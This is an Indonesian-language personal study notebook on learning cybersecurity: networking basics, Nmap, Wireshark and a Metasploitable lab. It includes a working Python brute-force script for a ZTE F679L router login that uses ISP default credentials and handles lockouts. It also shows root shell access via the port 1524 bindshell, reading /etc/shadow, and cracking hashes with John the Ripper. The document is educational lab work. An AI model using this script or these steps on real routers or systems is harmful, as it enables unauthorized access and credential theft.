# 🔐 Catatan Belajar Cyber Security
**by Acephaikal**

> Ini catatan perjalanan belajar cyber security saya dari nol. Mulai dari yang paling dasar sampai bisa praktik langsung di lab sendiri. Semoga bermanfaat buat yang lain juga!

---

## 📚 Daftar Isi
1. [Fondasi Networking](#1-fondasi-networking)
2. [Setup Lab](#2-setup-lab)
3. [Nmap — Network Scanner](#3-nmap--network-scanner)
4. [Wireshark — Traffic Analyzer](#4-wireshark--traffic-analyzer)
5. [Web Application — Brute Force Router Login](#5-web-application--brute-force-router-login)
6. [Eksploitasi Metasploitable](#6-eksploitasi-metasploitable)
7. [Password Cracking](#7-password-cracking)
8. [Kesimpulan](#8-kesimpulan)

---

## 1. Fondasi Networking

Sebelum bisa ngerti hacking, harus paham dulu cara kerja jaringan. Ini fondasi yang wajib dikuasai.

### IP Address
IP Address itu ibarat **alamat rumah** di dunia digital. Setiap perangkat yang terhubung ke jaringan punya IP address.

Ada 2 jenis:
- **IP Private** — alamat yang cuma berlaku di jaringan lokal (rumah/kantor). Contoh: `192.168.1.x`, `10.x.x.x`
- **IP Public** — alamat yang dipakai untuk komunikasi ke internet. Unik di seluruh dunia.

> Analoginya: IP Private itu seperti nomor kamar di hotel, IP Public itu seperti alamat hotelnya.

Cara cek IP di Linux:
```bash
ip a
```

Cara cek IP Public: buka Google dan ketik "what is my ip"

---

### Port & Protocol

Kalau IP Address itu alamat rumah, **Port** itu nomor pintunya. Satu komputer bisa punya banyak "pintu" untuk layanan yang berbeda-beda.

Port yang wajib dihapal:

| Port | Layanan | Fungsi |
|------|---------|--------|
| 21 | FTP | Transfer file |
| 22 | SSH | Remote login aman |
| 23 | Telnet | Remote login (tidak aman) |
| 53 | DNS | Terjemahkan domain ke IP |
| 80 | HTTP | Website tidak terenkripsi |
| 443 | HTTPS | Website terenkripsi |
| 3389 | RDP | Remote Desktop Windows |

**Protocol** adalah aturan cara data dikirim:
- **TCP** — seperti telepon, harus connect dulu, data dijamin sampai
- **UDP** — seperti radio, tidak perlu connect, lebih cepat tapi tidak dijamin sampai

---

### DNS (Domain Name System)

DNS itu seperti **buku telepon** di internet. Kita ketik nama domain (google.com), DNS yang carikan IP address-nya.

Alurnya:
```
Ketik "google.com" di browser
       ↓
Komputer tanya ke DNS server: "IP address google.com itu apa?"
       ↓
DNS jawab: "142.250.190.78"
       ↓
Browser connect ke IP itu
```

Cara cek DNS lookup:
```bash
nslookup google.com
```

---

### MAC Address

MAC Address itu **sidik jari** perangkat — unik, tertanam di hardware, dan tidak berubah meskipun pindah jaringan.

- **IP Address** = alamat yang bisa berubah tergantung jaringan
- **MAC Address** = identitas permanen perangkat

Format: `00:1A:2B:3C:4D:5E` (6 pasang angka/huruf hex)

> Catatan: Android modern punya fitur **MAC Randomization** — MAC address-nya diacak setiap connect ke WiFi baru untuk privasi.

---

## 2. Setup Lab

### Tools yang dipakai
- **VirtualBox** — untuk menjalankan VM (Virtual Machine)
- **Kali Linux** — OS untuk belajar cyber security (attacker)
- **Metasploitable 2** — target latihan yang sengaja dibuat penuh celah

### Konfigurasi Jaringan Lab

```
[Kali Linux]  ←→  [Metasploitable 2]
192.168.56.x       192.168.56.x
     ↕
Host-Only Network (terisolasi dari internet)
```

Pakai mode **Host-Only** supaya:
- Kali dan Metasploitable bisa saling komunikasi
- Tidak terhubung ke internet atau jaringan rumah
- Aman 100% untuk eksperimen

### Cara Install Kali di VirtualBox
1. Download image `.7z` dari kali.org/get-kali (pilih Virtual Machines)
2. Extract file `.7z`
3. Double-click file `.vbox` hasil extract
4. Kali langsung muncul di VirtualBox
5. Default login: `kali:kali` (wajib diganti!)

### Default Credentials Metasploitable
```
Username: msfadmin
Password: msfadmin
```
Sengaja dibiarkan lemah untuk tujuan belajar. **Jangan pernah expose VM ini ke internet!**

---

## 3. Nmap — Network Scanner

Nmap (Network Mapper) adalah tools untuk **scan port** — cek port mana yang terbuka di sebuah target dan service apa yang jalan di sana.

> Analogi: Nmap itu seperti mengetuk semua pintu dan jendela sebuah gedung untuk cek mana yang terbuka.

⚠️ **Etika:** Nmap hanya boleh dipakai ke sistem milik sendiri atau yang ada izin tertulis. Scan ke sistem orang lain tanpa izin = ilegal (UU ITE).

### Perintah-perintah Nmap

**Scan dasar:**
```bash
nmap localhost
nmap 192.168.1.1
```

**Deteksi versi service:**
```bash
nmap -sV 192.168.56.102
```

**Aggressive scan (versi + OS + script):**
```bash
sudo nmap -A -sC -sV localhost
```

**Scan semua 65535 port:**
```bash
nmap -p- 192.168.56.102
```

**Scan port tertentu:**
```bash
nmap -p 22,80,443 192.168.56.102
```

**Cek metode autentikasi SSH:**
```bash
nmap --script ssh-auth-methods localhost
```

**Scan vulnerability otomatis:**
```bash
sudo nmap --script vuln 192.168.56.102
```

### Hasil Scan Metasploitable
Ini hasil scan Metasploitable — contoh nyata sistem yang penuh celah:

```
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 2.3.4        ← ada backdoor!
22/tcp   open  ssh         OpenSSH 4.7p1       ← versi sangat lama
23/tcp   open  telnet      Linux telnetd       ← tidak terenkripsi
80/tcp   open  http        Apache httpd 2.2.8
1524/tcp open  bindshell   Metasploitable root shell  ← ROOT SHELL TERBUKA!
3306/tcp open  mysql       MySQL 5.0.51a
6667/tcp open  irc         UnrealIRCd          ← ada backdoor!
```

Beda banget sama sistem yang aman yang semua portnya tertutup.

---

## 4. Wireshark — Traffic Analyzer

Wireshark adalah tools untuk **menangkap dan menganalisis paket data** yang lewat di jaringan secara real-time.

> Analogi: Kalau internet itu jalan raya, Wireshark itu CCTV yang merekam setiap kendaraan yang lewat — kamu bisa lihat dari mana, mau ke mana, dan isi muatannya.

### Cara pakai Wireshark
1. Buka: `sudo wireshark`
2. Pilih interface (eth0 untuk jaringan, lo untuk localhost)
3. Klik start (ikon sirip hiu biru)
4. Generate traffic (ping, browsing, dll)
5. Klik stop (kotak merah)
6. Analisis hasilnya

### Cara baca output Wireshark

Setiap baris = satu paket data, dengan kolom:
- **No** — nomor urut paket
- **Time** — waktu paket ditangkap
- **Source** — IP pengirim
- **Destination** — IP tujuan
- **Protocol** — jenis protocol (DNS, ICMP, TCP, ARP, dll)
- **Length** — ukuran paket dalam bytes
- **Info** — ringkasan isi paket

### Filter yang berguna
```
dns        → tampilkan hanya paket DNS
icmp       → tampilkan hanya paket ping
tcp        → tampilkan hanya paket TCP
http       → tampilkan hanya traffic HTTP
ip.addr == 192.168.1.1  → filter berdasarkan IP
```

### Contoh hasil capture
Waktu kita jalankan `ping google.com`, di Wireshark kelihatan:
1. **DNS query** — komputer tanya IP address google.com
2. **DNS response** — server DNS jawab dengan IP-nya
3. **ICMP request** — ping dikirim ke Google
4. **ICMP reply** — Google balas ping
5. **ARP** — cari MAC address di jaringan lokal

---

## 5. Web Application — Brute Force Router Login

Ini salah satu praktik paling seru — berhasil masuk ke admin panel router sendiri dengan cara reverse engineer kode JavaScript-nya dulu, lalu bikin script Python brute force dari nol.

### Target
Router **ZTE F679L** dengan IP `192.168.1.1` (router rumah sendiri).

### Langkah 1 — Scan Router dengan Nmap

```bash
nmap 192.168.1.1
```

Hasilnya:
```
PORT    STATE SERVICE
53/tcp  open  domain   ← DNS server
80/tcp  open  http     ← halaman admin router
443/tcp open  https    ← halaman admin router (terenkripsi)
```

Port 80 terbuka = ada halaman web login admin router!

### Langkah 2 — Analisis Halaman Login

Buka browser ke `http://192.168.1.1` — muncul halaman login ZTE F679L.

Untuk tahu bagaimana proses login bekerja, kita pakai **Developer Tools** (F12) di browser:
1. Buka tab **Network**
2. Centang **Preserve log**
3. Coba login sekali (boleh salah)
4. Lihat request yang muncul

Ketemu request ke: `/?_type=loginData&_tag=login_token`

### Langkah 3 — Reverse Engineer JavaScript

Buka **Ctrl+U** (View Page Source) lalu cari kata `encrypt`. Ketemu fungsi kunci ini di source code:

```javascript
function g_loginToken(xml) {
    var xmlObj = $(xml).text();        // ambil TOKEN dari router
    var Password = $("#Frm_Password").val();
    var SHA256Password = sha256(Password + xmlObj);  // hash: password + token
    
    postData["Password"] = SHA256Password;
    postData["Username"] = $("#Frm_Username").val();
    
    $.post("/?_type=loginData&_tag=login_entry", postData, undefined, "json")
}
```

**Kesimpulan:** Router pakai **Challenge-Response Authentication**:
1. Browser minta TOKEN dulu dari server
2. Password di-hash dengan rumus: `SHA256(password + token)`
3. Hash itu yang dikirim ke server (bukan password asli)

Ini lebih aman dari HTTP biasa karena:
- Token selalu berubah setiap kali login → tidak bisa di-replay
- Password asli tidak pernah lewat jaringan

### Langkah 4 — Buat Script Python Brute Force

Karena kita sudah tahu algoritmanya (`SHA256(password + token)`), kita bisa bikin script Python yang mereplikasi proses itu:

```python
import requests
import hashlib
import time
import xml.etree.ElementTree as ET

TARGET = "http://192.168.1.1"

# Kombinasi username:password yang akan dicoba
CREDENTIALS = [
    ("user", "user"),
    ("user", "1234"),
    ("user", "12345"),
    ("user", "admin"),
    ("admin", "admin@zxhn"),
    ("admin", "Telkomdso123"),
    ("admin", "indihome"),
    ("admin", "iforte"),
    ("admin", "playmedia"),
]

def get_token(session):
    # Minta token dari router (berformat XML)
    r = session.get(f"{TARGET}/?_type=loginData&_tag=login_token", timeout=5)
    # Parse XML dan ambil nilai teks di dalamnya
    root = ET.fromstring(r.text)
    return "".join(root.itertext()).strip()

def try_login(session, username, password, token):
    # Replikasi algoritma JavaScript: SHA256(password + token)
    sha256_pass = hashlib.sha256((password + token).encode()).hexdigest()
    
    data = {
        "action": "login",
        "Username": username,
        "Password": sha256_pass,
    }
    
    r = session.post(
        f"{TARGET}/?_type=loginData&_tag=login_entry",
        data=data,
        timeout=5
    )
    return r.json()

def main():
    session = requests.Session()
    
    for username, password in CREDENTIALS:
        try:
            print(f"[*] Mencoba: {username}:{password}")
            token = get_token(session)
            result = try_login(session, username, password, token)
            
            lockingTime = result.get("lockingTime", -1)
            loginErrMsg = result.get("loginErrMsg", "")
            promptMsg = result.get("promptMsg", "")

            # Kena lockout? Tunggu dulu
            if lockingTime > 0:
                print(f"    Kena lockout {lockingTime} detik, menunggu...")
                time.sleep(lockingTime + 2)
                continue

            # Cek apakah login berhasil
            if loginErrMsg == "" and promptMsg == "":
                print(f"\n[+] BERHASIL! Username: {username} | Password: {password}")
                return
            else:
                print(f"    Gagal: {loginErrMsg or promptMsg}")

            # Jeda 2 detik antar percobaan supaya tidak langsung lockout
            time.sleep(2)

        except Exception as e:
            print(f"    Error: {e}")

    print("\n[-] Semua kombinasi gagal.")

if __name__ == "__main__":
    main()
```

### Langkah 5 — Jalankan Script

Simpan file dulu:
```bash
nano bruteforce_router.py
# paste kode di atas, lalu Ctrl+O → Enter → Ctrl+X
```

Jalankan:
```bash
python3 bruteforce_router.py
```

### Hasil

```
[*] Mencoba: user:user
    Kena lockout 34 detik, menunggu...
[*] Mencoba: user:1234
    Gagal: Username or password is error.
...
[+] BERHASIL! Username: user | Password: user
```

**Berhasil masuk dengan `user:user`!**

Buktinya — di browser muncul peringatan:
```
Warning! Another user is configuring the device!
192.168.1.23(user)
```

Router mendeteksi ada sesi aktif dari IP Kali (`192.168.1.23`) dengan username `user` — itu script kita yang berhasil login!

### Yang Dipelajari dari Praktik Ini

**Challenge-Response Authentication** — teknik keamanan yang bikin brute force jadi lebih susah karena password di-hash dengan token yang selalu berubah.

**Default Credentials** — banyak perangkat yang tidak pernah diganti passwordnya. `user:user` dan `admin:admin` selalu jadi percobaan pertama.

**Rate Limiting / Account Lockout** — router ZTE punya proteksi: setelah 3x gagal login, akun dikunci sementara. Ini pertahanan dasar terhadap brute force.

**Pentingnya ganti default password** — kalau password router sudah diganti ke yang kuat, brute force dengan wordlist standar tidak akan berhasil.

> ⚠️ Praktik ini dilakukan ke router milik sendiri. Melakukan hal ini ke router orang lain tanpa izin = melanggar UU ITE.

---

## 6. Eksploitasi Metasploitable

### Apa itu Eksploitasi?
Eksploitasi = memanfaatkan celah keamanan untuk masuk ke sistem target.

Di Metasploitable ada banyak celah — kita pakai yang paling gampang dulu: **port 1524 (bindshell)**.

### Netcat — Swiss Army Knife Networking
Netcat (`nc`) adalah tools untuk membuka koneksi ke IP dan port tertentu.

```bash
nc [IP target] [port]
```

### Eksploitasi Port 1524 (Bindshell)

Port 1524 di Metasploitable punya **root shell yang terbuka** — siapapun yang connect langsung dapat akses root tanpa username/password!

```bash
nc 192.168.56.102 1524
```

Hasilnya:
```
root@metasploitable:/#
```

Langsung masuk sebagai **root** (administrator tertinggi)!

### Post Exploitation — Apa yang dilakukan setelah masuk?

**Cek siapa kita:**
```bash
whoami
# output: root
```

**Lihat semua user di sistem:**
```bash
cat /etc/passwd
```

Format file `/etc/passwd`:
```
username:x:UID:GID:info:home_dir:shell
```

**Ambil hash password (target utama!):**
```bash
cat /etc/shadow
```

Format file `/etc/shadow`:
```
username:$hash_type$salt$hash:tanggal:...
```

Contoh hash yang kita dapat:
```
root:$1$/avpfBJ1$x0z8w5UF9Iv./DR9E9Lid.
msfadmin:$1$XN10Zj2c$Rt/zzCW3mLtUWA.ihZjA5/
user:$1$HESu9xrH$k.o3G93DGoXIiQKkPmUgZ0
```

`$1$` = hash MD5 (algoritma lama yang lemah)

---

## 7. Password Cracking

### Apa itu Hash Password?
Linux tidak simpan password asli — hanya **hash**-nya.

Hash = hasil dari fungsi satu arah. Seperti jus buah:
- Buah → jus ✅ (bisa)
- Jus → buah ❌ (tidak bisa)

```
"msfadmin" → [MD5] → $1$XN10Zj2c$Rt/zzCW3mLtUWA.ihZjA5/
```

### Cara Crack Hash — John the Ripper

John the Ripper adalah tools untuk crack hash password dengan teknik **dictionary attack** — coba password satu per satu dari wordlist sampai ada yang cocok.

**Simpan hash ke file:**
```bash
cat > allhash.txt << 'EOF'
root:$1$/avpfBJ1$x0z8w5UF9Iv./DR9E9Lid.
msfadmin:$1$XN10Zj2c$Rt/zzCW3mLtUWA.ihZjA5/
user:$1$HESu9xrH$k.o3G93DGoXIiQKkPmUgZ0
postgres:$1$Rw35ik.x$MgQgZUuO5pAoUvfJhfcYe/
service:$1$kR3ue7JZ$7GxELDupr5Ohp6cjZ3Bu//
EOF
```

**Crack pakai rockyou.txt (14 juta password):**
```bash
john allhash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

**Lihat hasil:**
```bash
john allhash.txt --show
```

**Hasil yang kita dapat:**
```
msfadmin:msfadmin    ← password = username (sangat lemah!)
service:service      ← sama juga!

2 password hashes cracked, 3 left
```

### Kesimpulan Password Cracking

| Password | Waktu crack |
|----------|-------------|
| Sama dengan username | Detik |
| Kata umum (password123) | Detik - menit |
| Campuran huruf + angka | Menit - jam |
| Huruf besar+kecil+angka+simbol, panjang | Bertahun-tahun |

---

## 8. Kesimpulan

### Full Pentest Workflow yang sudah dipraktikkan:

```
1. Reconnaissance
   └─ nmap 192.168.1.1 → temukan port 80 terbuka
   └─ nmap -sV 192.168.56.102 → temukan 23 port terbuka

2. Web Application Attack (Router)
   └─ Analisis halaman login pakai Developer Tools
   └─ Reverse engineer JavaScript authentication
   └─ Bikin script Python brute force
   └─ Berhasil login dengan user:user

3. Vulnerability Analysis (Metasploitable)
   └─ Port 1524 = bindshell (root shell terbuka)
   └─ Port 21 = vsftpd 2.3.4 (ada backdoor)

4. Exploitation
   └─ nc 192.168.56.102 1524
   └─ Dapat akses root tanpa password

5. Post Exploitation
   └─ cat /etc/shadow → ambil hash password
   └─ john allhash.txt → crack 2 password

6. Reporting
   └─ Dokumentasi ini!
```

### Pelajaran Penting

**Selalu ganti default credentials!**
Password `admin:admin`, `user:user`, `msfadmin:msfadmin` itu yang pertama dicoba hacker.

**Tutup port yang tidak dipakai!**
Setiap port terbuka = potensi celah. Prinsip: *Principle of Least Privilege*.

**Update sistem secara rutin!**
OpenSSH 4.7p1 di Metasploitable vs OpenSSH 10.3 di Kali — perbedaan versi = perbedaan keamanan.

**Password kuat itu wajib!**
Minimal 8 karakter, kombinasi huruf besar+kecil+angka+simbol.

### Roadmap Belajar Selanjutnya

```
✅ Fondasi Networking
✅ Nmap & Wireshark
✅ Web Application Attack (Brute Force Router)
✅ Basic Exploitation (Netcat + Bindshell)
✅ Password Cracking (John the Ripper)

⬜ Metasploit Framework
⬜ Web Application Hacking (SQL Injection, XSS)
⬜ Reverse Shell
⬜ Privilege Escalation
⬜ TryHackMe / HackTheBox
⬜ Sertifikasi (CEH, OSCP)
```

---

*Dokumentasi ini dibuat untuk keperluan belajar. Semua praktik dilakukan di lab sendiri (Metasploitable VM) yang legal dan aman. Jangan gunakan ilmu ini untuk hal yang merugikan orang lain.*

*"With great power comes great responsibility"*
